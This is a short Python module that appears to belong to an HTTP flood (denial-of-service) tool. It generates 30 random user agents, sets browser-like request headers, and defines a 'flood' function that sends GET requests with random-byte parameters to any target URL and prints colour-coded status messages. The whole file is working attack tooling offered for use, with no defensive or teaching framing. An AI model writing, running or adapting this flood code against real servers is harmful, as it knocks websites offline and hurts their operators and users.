import random

import requests
from colorama import Fore

import tools.randomData as randomData

# Loads user agents
user_agents = []
while len(user_agents) < 30:
    user_agent = randomData.random_useragent()
    if not user_agent in user_agents:
        user_agents.append(user_agent)

# Headers
headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
    "User-agent": random.choice(user_agents),
}

# Flood function
def flood(target):
    payload = str(random._urandom(random.randint(10, 150)))
    try:
        r = requests.get(target, params=payload, headers=headers, timeout=4)
    except requests.exceptions.ConnectTimeout:
        print(f"{Fore.RED}[!] {Fore.MAGENTA}Timed out!{Fore.RESET}")
    except Exception as e:
        print(
            f"{Fore.MAGENTA}Error sending GET requests!\n{Fore.MAGENTA}{e}{Fore.RESET}"
        )
    else:
        print(
            f"{Fore.GREEN}[{r.status_code}] {Fore.CYAN}Request sending! Payload Size: {len(payload)}.{Fore.RESET}"
        )
